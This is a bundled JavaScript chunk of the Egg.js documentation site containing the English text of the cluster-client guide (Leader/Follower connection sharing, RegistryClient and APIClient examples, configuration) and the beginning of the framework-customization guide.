"use strict";(self.webpackChunkegg=self.webpackChunkegg||[]).push([[1904],{6751:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(28704),r={}},19173:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(88921),r={}},1645:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(82840),r={}},18151:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(19057),r={}},81218:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(50343),r={}},63712:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(16016),r={}},79995:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(48930),r={}},8060:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(42283),r={}},27516:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(85667),r={}},59318:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(58920),r={}},54202:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(99292),r={}},10320:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(35182),r={}},77121:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(11089),r={}},65304:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(13388),r={}},50532:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(4780),r={}},25904:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(15681),r={}},43319:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(55506),r={}},58760:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(34502),r={}},28228:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(8907),r={}},97778:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(17351),r={}},40087:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(33346),r={}},63649:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(10983),r={}},31130:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(40926),r={}},82942:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(60373),r={}},42891:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(75666),r={}},9842:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(79174),r={}},28681:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(35903),r={}},36680:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(22055),r={}},58938:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(98605),r={}},77637:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(26015),r={}},79204:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(30085),r={}},39289:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(97704),r={}},14170:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(16329),r={}},33356:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(30717),r={}},56288:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(90349),r={}},2191:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(29600),r={}},39433:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(95800),r={}},51924:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(92982),r={}},88231:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(64372),r={}},51228:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(669),r={}},55252:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(85705),r={}},65511:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(95867),r={}},61819:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(56581),r={}},4274:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(27753),r={}},56151:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(54851),r={}},52930:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(72629),r={}},13733:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(58479),r={}},97184:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(42877),r={}},37182:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(60388),r={}},70973:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(78913),r={}},93137:function(n,a,e){e.r(a),e.d(a,{demos:function(){return r}});var o=e(38497),t=e(7385),r={}},36136:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(28704);const t=[{value:"In the previous ",paraId:0},{value:"Multi-Process Model chapter",paraId:1},{value:", we covered the multi-process model of the framework in detail, whose Agent process suits for a common class of scenarios: some middleware clients need to establish a persistent connection with server. In theory, a server had better establish only one persistent connection. However, the multi-process model will result in n times (n = number of Worker processes) connections being created.",paraId:0},{value:`+--------+   +--------+
| Client |   | Client |   ... n
+--------+   +--------+
    |  \\     /   |
    |    \\ /     |        n * m links
    |    / \\     |
    |  /     \\   |
+--------+   +--------+
| Server |   | Server |   ... m
+--------+   +--------+
`,paraId:2},{value:"In order to reuse persistent connections as much as possible (because they are very valuable resources for server), we put them into the Agent process to maintain, and then we transmit data to each Worker via messenger. It's feasible but we often need to write many codes to encapsulate the interface and realize data transmission, which is very troublesome.",paraId:3},{value:"In addition, it's relatively inefficient to transmit data via messenger, since messenger will do the transmission through the Master; In case IPC channel goes wrong, it would probably break Master process down.",paraId:4},{value:"So is there any better way? The answer is: YES! We provide a new type of model to reduce the complexity of this type of client encapsulation. The new Model bypasses the Master by establishing a direct socket between Agent and Worker. And as an external interface, Agent maintains shared connection among multiple Worker processes.",paraId:5},{value:"Inspired by the ",paraId:6,tocIndex:0},{value:"Leader/Follower",paraId:6,tocIndex:0},{value:" model.",paraId:6,tocIndex:0},{value:`The client is divided into two roles:
`,paraId:6,tocIndex:0},{value:"Leader: Be responsible for maintaining the connection with the remote server, only one Leader for the same type of client.",paraId:7,tocIndex:0},{value:"Follower: Delegate specific operations to the Leader. A common way is Subscribe-Model (let the Leader interact with remote server and wait for its return).",paraId:7,tocIndex:0},{value:`How to determine who Leader is, who Follower is? There are two modes:
`,paraId:6,tocIndex:0},{value:"Free competition mode: clients determine the Leader by the competition of the local port when start up. For example: every one tries to monitor port 7777, and finally the only one instance who seizes it will become Leader, the rest will be Followers.",paraId:8,tocIndex:0},{value:"Mandatory mode: the framework designates a Leader and the rest are Followers.",paraId:8,tocIndex:0},{value:"we use mandatory mode inside the framework. The Leader can only be created inside the Agent, which is also in line with our positioning of the Agent.",paraId:6,tocIndex:0},{value:"When the framework starts up, Master will randomly select an available port as the communication port monitored by the Cluster Client, and passes it by parameter to Agent and App Worker.",paraId:6,tocIndex:0},{value:"Leader communicates with Follower through direct socket connection (through communication port), no longer needs Master to transit.",paraId:6,tocIndex:0},{value:"Under the new mode, the client's communication is as follows:",paraId:9,tocIndex:0},{value:`             +-------+
             | start |
             +---+---+
                 |
        +--------+---------+
      __| port competition |__
win /   +------------------+  \\ lose
   /                           \\
+---------------+     tcp conn     +-------------------+
| Leader(Agent) |<---------------->| Follower(Worker1) |
+---------------+                  +-------------------+
    |            \\ tcp conn
    |             \\
+--------+         +-------------------+
| Client |         | Follower(Worker2) |
+--------+         +-------------------+
`,paraId:10,tocIndex:0},{value:"We abstract the client interface into the following two broad categories, which is also a specification of the client interface. For clients that are in line with norms, we can automatically wrap it as Leader / Follower mode.",paraId:11,tocIndex:1},{value:`Subscribe / Publish Mode:
`,paraId:12,tocIndex:1},{value:"The ",paraId:13,tocIndex:1},{value:"subscribe(info, listener)",paraId:13,tocIndex:1},{value:" interface contains two parameters. The first one is the information subscribed and the second one is callback function for subscribe.",paraId:13,tocIndex:1},{value:"The ",paraId:13,tocIndex:1},{value:"publish(info)",paraId:13,tocIndex:1},{value:" interface contains a parameter which is the information subscribed.",paraId:13,tocIndex:1},{value:"Invoke Mode, supports three styles of interface: callback, promise and generator function, but generator function is recommended.",paraId:12,tocIndex:1},{value:"Client example",paraId:14,tocIndex:1},{value:`const Base = require('sdk-base');

class Client extends Base {
  constructor(options) {
    super(options); // remember to invoke ready after initialization is successful
    this.ready(true);
  }
  /**
   * Subscribe
   *
   * @param {Object} info - subscription information (a JSON object, try not to include attributes such as Function, Buffer, Date)
   * @param {Function} listener - monitoring callback function, receives a parameter as the result of monitoring
   */

  subscribe(info, listener) {
    // ...
  }
  /**
   * Publish
   *
   * @param {Object} info - publishing information, which is similar to that of subscribe described above
   */

  publish(info) {
    // ...
  }
  /**
   * Get data (invoke)
   *
   * @param {String} id - id
   * @return {Object} result
   */

  async getData(id) {
    // ...
  }
}
`,paraId:15,tocIndex:1},{value:'If Leader "dies", a new round of port contention will be triggered. The instance which seizes the port will be elected as the new Leader.',paraId:16,tocIndex:2},{value:"To ensure that the channel between Leader and Follower is healthy, heartbeat mechanism needs to be introduced. If the Follower does not send a heartbeat packet within a fixed time, the Leader will proactively disconnect from the Follower, which will trigger the reinitialization of Follower.",paraId:16,tocIndex:2},{value:"Leader and Follower exchange data via the following protocols:",paraId:17,tocIndex:3},{value:` 0       1       2               4                                                              12
 +-------+-------+---------------+---------------------------------------------------------------+
 |version|req/res|    reserved   |                          request id                           |
 +-------------------------------+-------------------------------+-------------------------------+
 |           timeout             |   connection object length    |   application object length   |
 +-------------------------------+---------------------------------------------------------------+
 |         conn object (JSON format)  ...                    |            app object             |
 +-----------------------------------------------------------+                                   |
 |                                          ...                                                  |
 +-----------------------------------------------------------------------------------------------+
`,paraId:18,tocIndex:3},{value:"On the communication port Leader starts a Local Server, via which all Leaders / Followers communicate.",paraId:19,tocIndex:3},{value:"After Follower connects Local Server, it will firstly send a register channel packet (introduction of the channel concept is to distinguish between different types of clients).",paraId:19,tocIndex:3},{value:"Local Server will assign Follower to a specified Leader (match based on client type).",paraId:19,tocIndex:3},{value:"Follower sends requests to Leader to subscribe and publish.",paraId:19,tocIndex:3},{value:"Leader notifies Follower through the subscribe result packet when the subscription data changes.",paraId:19,tocIndex:3},{value:"Follower sends a call request to the Leader. The Leader executes a corresponding operation after receiving, and returns the result.",paraId:19,tocIndex:3},{value:` +----------+             +---------------+          +---------+
 | Follower |             |  Local Server |          |  Leader |
 +----------+             +---------------+          +---------+
      |     register channel     |       assign to        |
      + -----------------------> |  --------------------> |
      |                          |                        |
      |                                subscribe          |
      + ------------------------------------------------> |
      |                                 publish           |
      + ------------------------------------------------> |
      |                                                   |
      |       subscribe result                            |
      | <------------------------------------------------ +
      |                                                   |
      |                                 invoke            |
      + ------------------------------------------------> |
      |          invoke result                            |
      | <------------------------------------------------ +
      |                                                   |
`,paraId:20,tocIndex:3},{value:"In the following I will use a simple example to introduce how to make a client support Leader / Follower mode in the framework.",paraId:21,tocIndex:4},{value:"The first step, our client is best to meet the interface conventions mentioned above, for example:",paraId:22,tocIndex:4},{value:`// registry_client.js
const URL = require('url');
const Base = require('sdk-base');

class RegistryClient extends Base {
  constructor(options) {
    super({
      // Specify a method for asynchronous start
      initMethod: 'init',
    });
    this._options = options;
    this._registered = new Map();
  }
  /**
   * Start logic
   */

  async init() {
    this.ready(true);
  }
  /**
   * Get configuration
   * @param {String} dataId - the dataId
   * @return {Object} configuration
   */

  async getConfig(dataId) {
    return this._registered.get(dataId);
  }
  /**
   * Subscribe
   * @param {Object} reg
   *   - {String} dataId - the dataId
   * @param {Function} listener - the listener
   */

  subscribe(reg, listener) {
    const key = reg.dataId;
    this.on(key, listener);

    const data = this._registered.get(key);
    if (data) {
      process.nextTick(() => listener(data));
    }
  }
  /**
   * publish
   * @param {Object} reg
   *   - {String} dataId - the dataId
   *   - {String} publishData - the publish data
   */

  publish(reg) {
    const key = reg.dataId;
    let changed = false;

    if (this._registered.has(key)) {
      const arr = this._registered.get(key);
      if (arr.indexOf(reg.publishData) === -1) {
        changed = true;
        arr.push(reg.publishData);
      }
    } else {
      changed = true;
      this._registered.set(key, [reg.publishData]);
    }
    if (changed) {
      this.emit(
        key,
        this._registered.get(key).map((url) => URL.parse(url, true)),
      );
    }
  }
}

module.exports = RegistryClient;
`,paraId:23,tocIndex:4},{value:"The second step is to encapsulate the ",paraId:24,tocIndex:4},{value:"RegistryClient",paraId:24,tocIndex:4},{value:" using the ",paraId:24,tocIndex:4},{value:"agent.cluster",paraId:24,tocIndex:4},{value:" interface:",paraId:24,tocIndex:4},{value:`// agent.js
const RegistryClient = require('registry_client');

module.exports = (agent) => {
  // encapsulate and instantiate RegistryClient
  agent.registryClient = agent
    .cluster(RegistryClient) // parameter of create method is the parameter of RegistryClient constructor
    .create({});

  agent.beforeStart(async () => {
    await agent.registryClient.ready();
    agent.coreLogger.info('registry client is ready');
  });
};
`,paraId:25,tocIndex:4},{value:"The third step, use the ",paraId:26,tocIndex:4},{value:"app.cluster",paraId:26,tocIndex:4},{value:" interface to encapsulate ",paraId:26,tocIndex:4},{value:"RegistryClient",paraId:26,tocIndex:4},{value:":",paraId:26,tocIndex:4},{value:`// app.js
const RegistryClient = require('registry_client');

module.exports = (app) => {
  app.registryClient = app.cluster(RegistryClient).create({});
  app.beforeStart(async () => {
    await app.registryClient.ready();
    app.coreLogger.info('registry client is ready');

    // invoke subscribe to subscribe
    app.registryClient.subscribe(
      {
        dataId: 'demo.DemoService',
      },
      (val) => {
        // ...
      },
    );

    // invoke publish to publsih data
    app.registryClient.publish({
      dataId: 'demo.DemoService',
      publishData: 'xxx',
    });

    // invoke getConfig interface
    const res = await app.registryClient.getConfig('demo.DemoService');
    console.log(res);
  });
};
`,paraId:27,tocIndex:4},{value:"Isn't it so simple?",paraId:28,tocIndex:4},{value:"Of course, if your client is not so \u300Estandard\u300F, then you may need to use some other APIs, for example, your subscription function is not named ",paraId:29,tocIndex:4},{value:"subscribe",paraId:29,tocIndex:4},{value:", but ",paraId:29,tocIndex:4},{value:"sub",paraId:29,tocIndex:4},{value:":",paraId:29,tocIndex:4},{value:`class MockClient extends Base {
  constructor(options) {
    super({
      initMethod: 'init',
    });
    this._options = options;
    this._registered = new Map();
  }

  async init() {
    this.ready(true);
  }

  sub(info, listener) {
    const key = reg.dataId;
    this.on(key, listener);

    const data = this._registered.get(key);
    if (data) {
      process.nextTick(() => listener(data));
    }
  }

  ...
}
`,paraId:30,tocIndex:4},{value:"You need to set it manually with the ",paraId:31,tocIndex:4},{value:"delegate",paraId:31,tocIndex:4},{value:" API:",paraId:31,tocIndex:4},{value:`// agent.js
module.exports = (agent) => {
  agent.mockClient = agent
    .cluster(MockClient)
    // delegate sub to logic of subscribe
    .delegate('sub', 'subscribe')
    .create();

  agent.beforeStart(async () => {
    await agent.mockClient.ready();
  });
};
`,paraId:32,tocIndex:4},{value:`// app.js
module.exports = (app) => {
  app.mockClient = app
    .cluster(MockClient)
    // delegate sub to subscribe logic
    .delegate('sub', 'subscribe')
    .create();

  app.beforeStart(async () => {
    await app.mockClient.ready();

    app.sub({ id: 'test-id' }, (val) => {
      // put your code here
    });
  });
};
`,paraId:33,tocIndex:4},{value:"We've already known that using ",paraId:34,tocIndex:4},{value:"cluster-client",paraId:34,tocIndex:4},{value:" allows us to develop a \u300Epure\u300F RegistryClient without understanding the multi-process model. We can only focus on interacting with server, and use the ",paraId:34,tocIndex:4},{value:"cluster-client",paraId:34,tocIndex:4},{value:" with a simple wrap to get a ",paraId:34,tocIndex:4},{value:"ClusterClient",paraId:34,tocIndex:4},{value:" which supports multi-process model. The ",paraId:34,tocIndex:4},{value:"RegistryClient",paraId:34,tocIndex:4},{value:" here is actually a ",paraId:34,tocIndex:4},{value:"DataClient",paraId:34,tocIndex:4},{value:" that is specifically responsible for data communication with remote service.",paraId:34,tocIndex:4},{value:"You may have noticed that the ",paraId:35,tocIndex:4},{value:"ClusterClient",paraId:35,tocIndex:4},{value:" brings with several constraints at the same time. If you want to expose the same approach to each process, ",paraId:35,tocIndex:4},{value:"RegistryClient",paraId:35,tocIndex:4},{value:" can only support sub/pub mode and asynchronous API calls. Because all interactions in multi-process model must use socket communications, under which it is bound to bring this constraint.",paraId:35,tocIndex:4},{value:"Suppose we want to realize a synchronous ",paraId:36,tocIndex:4},{value:"get",paraId:36,tocIndex:4},{value:" method. Put subscribed data directly into memory and use the ",paraId:36,tocIndex:4},{value:"get",paraId:36,tocIndex:4},{value:" method to return data directly. How to achieve it? The real situation may be more complicated.",paraId:36,tocIndex:4},{value:"Here, we introduce an ",paraId:37,tocIndex:4},{value:"APIClient",paraId:37,tocIndex:4},{value:" best practice. For modules that have requirements of synchronous API such as reading cached data, an ",paraId:37,tocIndex:4},{value:"APIClient",paraId:37,tocIndex:4},{value:" is encapsulated base on RegistryClient to implement these APIs that are not related to interaction with the remote server. The ",paraId:37,tocIndex:4},{value:"APIClient",paraId:37,tocIndex:4},{value:" instance is exposed to the user.",paraId:37,tocIndex:4},{value:"In ",paraId:38,tocIndex:4},{value:"APIClient",paraId:38,tocIndex:4},{value:" internal implementation:",paraId:38,tocIndex:4},{value:"To obtain data asynchronously, invoke RegistryClient's API base on ClusterClient.",paraId:39,tocIndex:4},{value:"Interfaces that are unrelated to server, such as synchronous call, are to be implemented in ",paraId:39,tocIndex:4},{value:"APIClient",paraId:39,tocIndex:4},{value:". Since ClusterClient's APIs have flushed multi-process differences, there is no need to concern about multi-process model when calls to RegistryClient during developing ",paraId:39,tocIndex:4},{value:"APIClient",paraId:39,tocIndex:4},{value:".",paraId:39,tocIndex:4},{value:"For example, add a synchronous get method with buffer in the ",paraId:40,tocIndex:4},{value:"APIClient",paraId:40,tocIndex:4},{value:" module:",paraId:40,tocIndex:4},{value:`// some-client/index.js
const cluster = require('cluster-client');
const RegistryClient = require('./registry_client');

class APIClient extends Base {
  constructor(options) {
    super(options); // options.cluster is used to pass app.cluster to Egg's plugin

    this._client = (options.cluster || cluster)(RegistryClient).create(options);
    this._client.ready(() => this.ready(true));

    this._cache = {};

    // subMap:
    // {
    //   foo: reg1,
    //   bar: reg2,
    // }
    const subMap = options.subMap;

    for (const key in subMap) {
      this.subscribe(subMap[key], (value) => {
        this._cache[key] = value;
      });
    }
  }

  subscribe(reg, listener) {
    this._client.subscribe(reg, listener);
  }

  publish(reg) {
    this._client.publish(reg);
  }

  get(key) {
    return this._cache[key];
  }
}

// at last the module exposes this APIClient
module.exports = APIClient;
`,paraId:41,tocIndex:4},{value:"Then we can use this module like this:",paraId:42,tocIndex:4},{value:`// app.js || agent.js
const APIClient = require('some-client'); // the module above
module.exports = app => {
  const config = app.config.apiClient;
  app.apiClient = new APIClient(Object.assign({}, config, { cluster: app.cluster });
  app.beforeStart(async () => {
    await app.apiClient.ready();
  });
};

// config.\${env}.js
exports.apiClient = {
  subMap: {
    foo: {
      id: '',
    },
    // bar...
  }
};
`,paraId:43,tocIndex:4},{value:"To make it easy for you to encapsulate ",paraId:44,tocIndex:4},{value:"APIClient",paraId:44,tocIndex:4},{value:", we provide an",paraId:44,tocIndex:4},{value:" APIClientBase",paraId:44,tocIndex:4},{value:" base class in the ",paraId:44,tocIndex:4},{value:"cluster-client",paraId:44,tocIndex:4},{value:" module. Then ",paraId:44,tocIndex:4},{value:"APIClient",paraId:44,tocIndex:4},{value:" above can be rewritten as:",paraId:44,tocIndex:4},{value:`const APIClientBase = require('cluster-client').APIClientBase;
const RegistryClient = require('./registry_client');

class APIClient extends APIClientBase {
  // return the original client class
  get DataClient() {
    return RegistryClient;
  } // used to set the cluster-client related parameters, equivalent to the second parameter of the cluster method

  get clusterOptions() {
    return {
      responseTimeout: 120 * 1000,
    };
  }

  subscribe(reg, listener) {
    this._client.subscribe(reg, listener);
  }

  publish(reg) {
    this._client.publish(reg);
  }

  get(key) {
    return this._cache[key];
  }
}
`,paraId:45,tocIndex:4},{value:"in conclusion:",paraId:46,tocIndex:4},{value:`+------------------------------------------------+
| APIClient                                      |
|       +----------------------------------------|
|       | ClusterClient                          |
|       |      +---------------------------------|
|       |      | RegistryClient                  |
+------------------------------------------------+
`,paraId:47,tocIndex:4},{value:"RegistryClient - responsible for communicating with remote service, to access data, supports for asynchronous APIs only, and does't care about multi-process model.",paraId:48,tocIndex:4},{value:"ClusterClient - a client instance that is simply wrapped by the ",paraId:48,tocIndex:4},{value:"cluster-client",paraId:48,tocIndex:4},{value:" module and is responsible for automatically flushing differences in multi-process model.",paraId:48,tocIndex:4},{value:"APIClient - internally calls ",paraId:48,tocIndex:4},{value:"ClusterClient",paraId:48,tocIndex:4},{value:" to synchronize data, without the need to concern about multi-process model and is the final exposed module for users. APIs are exposed Through this, and support for synchronization and asynchronization.",paraId:48,tocIndex:4},{value:"Students who are interested may have look at ",paraId:49,tocIndex:4},{value:"enhanced multi-process development model",paraId:49,tocIndex:4},{value:" discussion process.",paraId:49,tocIndex:4},{value:`/**
 * @property {Number} responseTimeout - response timeout, default is 60000
 * @property {Transcode} [transcode]
 *   - {Function} encode - custom serialize method
 *   - {Function} decode - custom deserialize method
 */
config.clusterClient = {
  responseTimeout: 60000,
};
`,paraId:50,tocIndex:5},{value:"Configuration Items",paraId:51,tocIndex:5},{value:"Type",paraId:51,tocIndex:5},{value:"Default",paraId:51,tocIndex:5},{value:"Description",paraId:51,tocIndex:5},{value:"responseTimeout",paraId:51,tocIndex:5},{value:"number",paraId:51,tocIndex:5},{value:"60000 (one minute)",paraId:51,tocIndex:5},{value:"Global interprocess communication timeout, you cannot set too short, because the proxy interface itself has a timeout setting",paraId:51,tocIndex:5},{value:"transcode",paraId:51,tocIndex:5},{value:"function",paraId:51,tocIndex:5},{value:"N/A",paraId:51,tocIndex:5},{value:"Serialization of interprocess communication, by default ",paraId:51,tocIndex:5},{value:"serialize-json",paraId:51,tocIndex:5},{value:" (set up manually is not recommended)",paraId:51,tocIndex:5},{value:"The above is about global configuration. If you want to do a separate setting for a client:",paraId:52,tocIndex:5},{value:"You can override by setting the second argument ",paraId:53,tocIndex:5},{value:"options",paraId:53,tocIndex:5},{value:" in ",paraId:53,tocIndex:5},{value:"app/agent.cluster(ClientClass, options)",paraId:53,tocIndex:5},{value:":",paraId:53,tocIndex:5},{value:`app.registryClient = app
  .cluster(RegistryClient, {
    responseTimeout: 120 * 1000, // the parameters passing here are related to cluster-client
  })
  .create({
    // here are parameters required by RegistryClient
  });
`,paraId:54,tocIndex:5},{value:"You can also override the ",paraId:55,tocIndex:5},{value:"getter",paraId:55,tocIndex:5},{value:" attribute of ",paraId:55,tocIndex:5},{value:"clusterOptions",paraId:55,tocIndex:5},{value:" in ",paraId:55,tocIndex:5},{value:"APIClientBase",paraId:55,tocIndex:5},{value:":",paraId:55,tocIndex:5},{value:`const APIClientBase = require('cluster-client').APIClientBase;
const RegistryClient = require('./registry_client');

class APIClient extends APIClientBase {
  get DataClient() {
    return RegistryClient;
  }

  get clusterOptions() {
    return {
      responseTimeout: 120 * 1000,
    };
  }

  // ...
}

module.exports = APIClient;
`,paraId:56,tocIndex:5}]},67866:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(88921);const t=[{value:"If your team have met with these scenarios:",paraId:0},{value:"Each project contains the same configuration files that need to be copied every time, such as ",paraId:1},{value:"gulpfile.js",paraId:1},{value:", ",paraId:1},{value:"webpack.config.js",paraId:1},{value:".",paraId:1},{value:"Each project has similar dependencies.",paraId:1},{value:"It's difficult to synchronize those projects based on the same configurations like those mentioned above once they have been optimized?",paraId:1},{value:"If your team needs:",paraId:2},{value:"a unified technique selection, such as the choice of databases, templates, frontend frameworks, and middlewares.",paraId:3},{value:"a unified default configuration to balance the deviation of different situations, which are not supposed to resolve in code level, like the differences between companies and open communities.",paraId:3},{value:"a unified ",paraId:3},{value:"deployment plan",paraId:4},{value:" keeping developers concentrate on code without paying attention to deployment details of connecting the framework and platforms.",paraId:3},{value:"a unified code style to decrease code's repetition and optimize code's appearance, which is important for a enterprise level framework.",paraId:3},{value:"To satisfy these demands, Egg endows developers with the capacity of ",paraId:5},{value:"customizing a framework",paraId:5},{value:". It is just an abstract layer, which can be constructed to a higher level framework, supporting inheritance of unlimited times. Furthermore, Egg apply a quantity of coding conventions based on Koa.",paraId:5},{value:"Therefore, a uniform spec can be applied on projects in which the differentiation fulfilled in plugins. And the best practice summed from those projects can be continuously extracted from these plugins to the framework, which is available to other projects by just updating the dependencies' versions.",paraId:6},{value:"See more details in ",paraId:7},{value:"Progressive Development",paraId:8},{value:"\u3002",paraId:7},{value:"The framework extension is applied to Multiprocess Model, as we know ",paraId:9,tocIndex:0},{value:"Multiprocess Model",paraId:10,tocIndex:0},{value:" and the differences between Agent Worker and App Worker, which have different APIs and both need to inherit.",paraId:9,tocIndex:0},{value:"They both are inherited from ",paraId:11,tocIndex:0},{value:"EggCore",paraId:11,tocIndex:0},{value:", and Agent is instantiated during the initiation of Agent Worker, while App is instantiated during the initiation of App Worker.",paraId:11,tocIndex:0},{value:"We could regard EggCore as the advanced version of Koa Application, which integrates built-in features such as ",paraId:12,tocIndex:0},{value:"Loader",paraId:13,tocIndex:0},{value:"\u3001",paraId:12,tocIndex:0},{value:"Router",paraId:14,tocIndex:0},{value:" and asynchronous launch.",paraId:12,tocIndex:0},{value:`       Koa Application
              ^
           EggCore
              ^
       \u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510
       \u2502              \u2502
   Egg Agent      Egg Application
      ^               ^
 agent worker     app worker
`,paraId:15,tocIndex:0},{value:"Just use ",paraId:16,tocIndex:1},{value:"egg-boilerplate-framework",paraId:16,tocIndex:1},{value:" to generates a scaffold for you.",paraId:16,tocIndex:1},{value:`$ mkdir yadan && cd yadan
$ npm init egg --type=framework
$ npm i
$ npm test
`,paraId:17,tocIndex:1},{value:"But in order to illustrate details, let's do it step by step. Here is the ",paraId:18,tocIndex:1},{value:"sample code",paraId:18,tocIndex:1},{value:".",paraId:18,tocIndex:1},{value:"Each of those APIs is required to be implemented almost twice - one for Agent and another for Application.",paraId:19,tocIndex:2},{value:"egg.startCluster",paraId:20},{value:"This is the entry function of Egg's multiprocess launcher, based on ",paraId:21,tocIndex:3},{value:"egg-cluster",paraId:21,tocIndex:3},{value:", to start Master, but EggCore running in a single process doesn't invoke this function while Egg does.",paraId:21,tocIndex:3},{value:`const startCluster = require('egg').startCluster;
startCluster(
  {
    // directory of code
    baseDir: '/path/to/app',
    // directory of framework
    framework: '/path/to/framework',
  },
  () => {
    console.log('app started');
  },
);
`,paraId:22,tocIndex:3},{value:"All available options could be found in ",paraId:23,tocIndex:3},{value:"egg-cluster",paraId:23,tocIndex:3},{value:".",paraId:23,tocIndex:3},{value:"egg.Application",paraId:20},{value:"egg.Agent",paraId:20},{value:"These are both singletons but still different with each other. To inherit framework, it's likely to inherited these two classes.",paraId:24,tocIndex:4},{value:"egg.AppWorkerLoader",paraId:20},{value:"egg.AgentWorkerLoader",paraId:20},{value:"To customize framework, Loader is required and has to be inherited from Egg Loader for the propose of either loading directories or rewriting functions.",paraId:25,tocIndex:5},{value:"If we consider a framework as a class, then Egg framework is the base class,and implementing a framework demands to implement entire APIs of Egg.",paraId:26,tocIndex:6},{value:`// package.json
{
  "name": "yadan",
  "dependencies": {
    "egg": "^2.0.0"
  }
}

// index.js
module.exports = require('./lib/framework.js');

// lib/framework.js
const path = require('path');
const egg = require('egg');
const EGG_PATH = Symbol.for('egg#eggPath');

class Application extends egg.Application {
  get [EGG_PATH]() {
    // return the path of framework
    return path.dirname(__dirname);
  }
}

// rewrite Egg's Application
module.exports = Object.assign(egg, {
  Application,
});
`,paraId:27,tocIndex:6},{value:"The name of framework, default as ",paraId:28,tocIndex:6},{value:"egg",paraId:28,tocIndex:6},{value:", is a indispensable option to launch an application, set by ",paraId:28,tocIndex:6},{value:"egg.framework",paraId:28,tocIndex:6},{value:" of ",paraId:28,tocIndex:6},{value:"package.json",paraId:28,tocIndex:6},{value:", then Loader loads the exported app of a module named it.",paraId:28,tocIndex:6},{value:`{
  "scripts": {
    "dev": "egg-bin dev"
  },
  "egg": {
    "framework": "yadan"
  }
}
